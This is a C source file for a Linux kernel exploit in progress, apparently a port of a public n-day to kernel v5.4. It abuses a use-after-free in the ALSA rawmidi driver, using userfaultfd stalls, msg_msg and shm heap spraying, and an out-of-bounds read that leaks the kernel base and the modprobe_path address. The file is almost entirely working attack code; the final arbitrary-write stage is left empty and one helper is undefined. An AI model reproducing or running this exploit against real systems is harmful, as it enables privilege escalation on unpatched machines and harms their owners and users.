/*
    Port of exploit to v5.4 using a different write primitive
    Original exploit: https://1day.dev/notes/Linux-Kernel-n-day-exploit-development/

    The goal is to port it from v4.9.223 to v5.4 (or <5.7 where it got patched)
    since the write primitive got patched late v4.x. Currently playing with
    userfaultfd + pipe primitive but might end up doing FUSE + pipe primitive
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sound/asound.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <inttypes.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
// #include <pthread.h>
#include <sys/shm.h>
#include <time.h>
#include <sys/uio.h>
#define TRUE  (1==1)
#define FALSE (!TRUE)
#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)


#define DEV_RAWMIDI              "/dev/snd/midiC0D1"
#define MODPROBE_PATH_OFFSET     0x565e0
#define KBASE_OFFSET             0x169ac40
#define ADDRESS_PAGE_FAULT_1     0x5550000
#define ADDRESS_PAGE_FAULT_2     0x7770000
#define PAGE_SIZE                0x1000
#define MSG_COPY 				 040000
#define MSGHEADER_SIZE           0x30

struct thread_args{
    int id;
    int uffd;
    void* addr_to_trigger;
    char* content;
    int size;
};

struct thread_snd_write_args{
    void* addr;
    size_t size;
};

struct msgbuf {
    unsigned long mtype;  
    char mtext[1];
};

/* msg_msg */
#define Cyan(string) "\e[0;36m" string "\x1b[0m"
#define BCyan(string) "\e[1;36m" string "\x1b[0m"
#define MSGTYPE 0x537
#define MSGKEY 0x1337


long uffd;          /* userfaultfd file descriptor */
pthread_t tids[5];
int release_page_fault = TRUE;
int fd_rawmidi;

static void *
fault_handler_thread(struct thread_args* arg)
{
    static struct uffd_msg msg;    /* Data read from userfaultfd */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;
    void* addr_to_trigger;
    char* input_content;
    int input_size;

    uffd = arg->uffd;
    addr_to_trigger = arg->addr_to_trigger;
    input_content = arg->content;
    input_size = arg->size;

    /* Create a page that will be copied into the faulting region. */
    if (page == NULL) {
        page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
            errExit("mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
      file descriptor. */
    for (;;) {
        /* See what poll() tells us about the userfaultfd. */
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            errExit("poll");

        printf("\nfault_handler_thread():\n");
        printf("    poll() returns: nready = %d; "
                "POLLIN = %d; POLLERR = %d\n", nready,
                (pollfd.revents & POLLIN) != 0,
                (pollfd.revents & POLLERR) != 0);

        /* Read an event from the userfaultfd. */
        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0) errExit("EOF on userfaultfd!");
        if (nread == -1) errExit("read");
        /* We expect only one kind of event; verify that assumption. */
        if (msg.event != UFFD_EVENT_PAGEFAULT) errExit("Unexpected event on userfaultfd");
        else if (msg.event == UFFD_EVENT_PAGEFAULT) {
            /* Display info about the page-fault event. */
            printf("[+] Page Fault triggered for %p!\n", msg.arg.pagefault.address);
            //if(msg.arg.pagefault.address == (void*) ADDRESS_PAGE_FAULT_1 + PAGE_SIZE){
            if(msg.arg.pagefault.address == (void*) addr_to_trigger){
                printf("[*] satisfied msg.arg.pagefault.address == (void*) addr_to_trigger (%p)\n", addr_to_trigger);
                // release_page_fault = TRUE;
                while(release_page_fault == TRUE);
            }
            else{
                // Not our desired page fault
                printf("[-] NOT OUR CASE\n");
                continue;
            }

            printf("[+] PAGE FAULT RELEASED");
            printf("    UFFD_EVENT_PAGEFAULT event: ");
            printf("flags = %"PRIx64"; ", msg.arg.pagefault.flags);
            printf("address = 0x%"PRIx64"\n", msg.arg.pagefault.address);

            // Write into the new page desired input with desired input size
            memcpy(page, input_content, input_size); 

            uffdio_copy.src = (unsigned long) page;
            /* We need to handle page faults in units of pages(!).
            So, round faulting address down to page boundary. */

            uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &~(PAGE_SIZE - 1);
            uffdio_copy.len = PAGE_SIZE;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
                errExit("ioctl-UFFDIO_COPY");

            printf("        (uffdio_copy.copy returned %"PRId64")\n",
                uffdio_copy.copy);
            release_page_fault = TRUE;
            break;
        }

    }
    close(uffd);
    printf("[*] Page fault thread terminated\n" );
}

void l_print_qword(void* address){
    unsigned long first;
    unsigned long second;
    first = *(int64_t *) address;
    second = *(int64_t *) (address + 0x8);
    printf(BCyan("%p:\t"), address);
    printf(Cyan("0x%016lx 0x%016lx\n"), first, second);

}

void dump_memory(void* start_address, size_t size){
    void* end_address = start_address + size; // also if not padded to 8 it will be fine in the loop condition
    //printf("[D] [read_memory] start_addres: %p\n[D][read_memory] end_address: %p\n", start_address, end_address);
    printf("\n");
    while(start_address < end_address){
        l_print_qword(start_address);
        start_address = start_address + (8 * 2);
    }
}


void* thread_sound_write(struct thread_snd_write_args* arg ){
    void* addr;
    size_t size;
    ssize_t write_n;
    int fd_test;
    addr = arg->addr;
    size = arg->size;
    printf("[*] snd_write thread with addr:%p and size: %ld ..\n", addr, size);
    write_n = write(fd_rawmidi, addr, size);
    printf("bytes written: %zu\n", write_n);
}

int sound_resize_params(int stream, size_t buffer_size, size_t avail_min) {
    struct snd_rawmidi_params params = {0};
    params.stream = stream;
    params.buffer_size = buffer_size;
    params.avail_min = avail_min;
    int ioctl_res = ioctl(fd_rawmidi, SNDRV_RAWMIDI_IOCTL_PARAMS, &params);
    printf("[debug] ioctl_res: %d\n", ioctl_res);
    if ( ioctl_res  == -1)
        errExit("ioctl SNDRV_RAWMIDI_IOCTL_PARAMS");
    return 0;
}


int get_msg(int qid, void* out_buf, int msg_len, int msg_type){

    int r = msgrcv(qid, out_buf, msg_len, msg_type, IPC_NOWAIT | MSG_NOERROR);
    if (r == -1 ){
        if( errno != ENOMSG) {
            perror("msgrcv");
            return -1;
        }
        printf("[get_msg] No message received\n");
        return 0;
    }
    printf("[*] Received %d bytes \n", r);
    return 1;
}

int send_msg(int qid, void* memory, int msg_len, int msg_type) {
    struct msgbuf* msg_buf;
    msg_buf = malloc( sizeof(struct msgbuf) + msg_len );
    msg_buf->mtype = msg_type;
    memcpy(msg_buf->mtext, memory, msg_len);
    printf("[send_msg] Sending msg with type 0x%x on qid: 0x%x\n", msg_type, qid);
    if( msgsnd(qid, msg_buf, ( sizeof(msg_buf) + msg_len) , IPC_NOWAIT) == -1 ) {
        errExit("msgsnd");
    }
    return 0;
}

void init_userfault_thread(int th_num, void* addr_to_monitor, int range, char* input_content, int input_size){
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");
    uffdio_register.range.start = (unsigned long) addr_to_monitor;
    uffdio_register.range.len = range; // IMPORTANT: The range
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    printf("[+] userfaultfd registered\n");
    struct thread_args* args = (struct thread_args*) malloc(sizeof(struct thread_args));
    args->id = 1337;
    args->uffd = uffd;
    args->addr_to_trigger = addr_to_monitor;
    args->content = input_content;
    args->size = input_size;
    s = pthread_create(&tids[th_num], NULL, fault_handler_thread,(void*) args);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }
    
}

void spray_shm(int num) {
    int shmid[0x100]     = {0};
    void *shmaddr[0x100] = {0};
    for(int i = 0; i < num; i++){
        shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);
        if (shmid[i]  < 0) errExit("shmget");
        shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);
        if (shmaddr[i] < 0) errExit("shmat");
    }
}

void heap_groom(int size, int n, int type) {
	struct {
		long mtype;
		char mtext[size - 0x30];
    } msg;

    msg.mtype = type;
	int mqids[n];
    memset(msg.mtext, 0x21, sizeof(msg.mtext));
	for (int i = 0; i < n; i++) {
		mqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		if (msgsnd(mqids[i], &msg, sizeof(msg.mtext), 0) != 0)
				printf("[*] Error with msgsnd %d in heap_groom\n", mqids[i]);
	}
	for (int i = 0; i < n; i++) {
		if (msgrcv(mqids[i], &msg.mtext, sizeof(msg.mtext), type, 0) == -1)
			printf("[*] Error with msgrcv %d in heap_groom\n", mqids[i]);
	}
}

int main(void) {
    printf("[*] Starting exploit ..\n");
    prep_exploit();

    void* addr = (void*) ADDRESS_PAGE_FAULT_1;
    if(mmap(addr, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) == MAP_FAILED) errExit("mmap");

    // Content that will be overwritten from the page fault handler
    char content_first_userfault[PAGE_SIZE];
    memset(content_first_userfault, 0xff, PAGE_SIZE);

    // Init and start the user page fault thread
    // In this case the size is not important since we will block the write from the rawmidi write
    int init_tid = 1;
    init_userfault_thread(init_tid, addr + PAGE_SIZE, PAGE_SIZE, content_first_userfault, 0xff);

    fd_rawmidi = open(DEV_RAWMIDI, O_RDWR);
    if (fd_rawmidi < 0) errExit("fd");

    /* START */
    heap_groom(4096, 4, 69);
    int qid[10];
    srand(time(0));
    int msgkey = rand();
    int msgtype = rand();
    qid[0] = msgget(msgkey, IPC_CREAT | 0666);
    if( qid[0] == -1 ) errExit("msgget");

    spray_shm(32);

    /* Allocate and re-size the buffer in order to have an arbitrary sized chunk */
    // It's not important how much we write, kmalloc(PAGE_SIZE) will always be the first allocation
    char write_buffer[10] = {0};
    memset(&write_buffer, 0x41, 10);
    printf("[*] First write to init substream..\n");
    write(fd_rawmidi, &write_buffer, 4);

    // re-size in order to have an arbitrary sized chunk freed that lands in kmalloc-4096
    // this step can be skipped since our chunk is already in kmalloc-4096, but for future uses I keep it (if it's necessary to change the cache)
    printf("[*] Resizing buffer_size to 4096 ..\n");

    // sound_resize_params(int stream, size_t buffer_size, size_t avail_min)
    sound_resize_params(SNDRV_RAWMIDI_STREAM_OUTPUT, 4090, 7);

    // Trigger the PAGE FAULT only at 0x5550000 + PAGE_SIZE
    // Since we want to overwrite msg_msg->ms_ts (at 0x18) (and we do not want to overwrite everything before)
    memset(addr, 0x43, PAGE_SIZE);
    struct thread_snd_write_args snd_write_arg;
    snd_write_arg.addr = addr + PAGE_SIZE - 0x18;
    snd_write_arg.size = 0x18 + 0x2; // 0x2 is the 0xffff that will be written in msg_msg->ms_ts

    // Trigger the page fault and lock in copy_from_user
    pthread_create(&tids[2], NULL, thread_sound_write, &snd_write_arg);
    printf("[*] snd_write triggered (should fault) \n");

    void* mem = malloc(4096 * 2);
    memset(mem, 0x45, 4096 * 2);

    // We have to trigger the buffer re-size in order to free the object
    // sound_resize_params(int stream, size_t buffer_size, size_t avail_min)
    printf("[*] Freeing buf using SNDRV_RAWMIDI_IOCTL_PARAMS\n");
    sound_resize_params(SNDRV_RAWMIDI_STREAM_OUTPUT, 90, 7);

    printf("[*] Replacing freed obj with msg_msg .\n");
    // for (int i = 0; i < 3; i++) {
    //     send_msg(qid[0], mem, (4096 - 48) + 10, 1); // should fall in kmalloc-32
    // }
    send_msg(qid[0], mem, (PAGE_SIZE - MSGHEADER_SIZE) + 10, 1); 

    memset(mem, 0x46, 1024);
    
    spray_shm(100);

    release_page_fault = FALSE; 

    printf("[*] Waiting for userfaultd to finish ..\n");
    while(release_page_fault == FALSE); // Waits that the page fault handler ends
    
    printf("[+] Page fault lock released\n");
    unsigned long* res = malloc(PAGE_SIZE * 2);
    memset(res, 0x0, PAGE_SIZE * 2);
    
    get_msg(qid[0], res, PAGE_SIZE * 2, 1);
    dump_memory(res, PAGE_SIZE * 2);

    unsigned long init_ipc_ns = *(res + (0xff8 / sizeof(unsigned long)));
    unsigned long modprobe_path = init_ipc_ns - MODPROBE_PATH_OFFSET;
    unsigned long kbase = init_ipc_ns - KBASE_OFFSET;
    printf("[+] init_ipc_ns @0x%lx\n", init_ipc_ns);
    printf("[+] calculated kbase @0x%lx\n", kbase);
    printf("[+] calculated modprobe_path @0x%lx\n", modprobe_path);


    /* ARBITRARY WRITE with pipe buffer */


}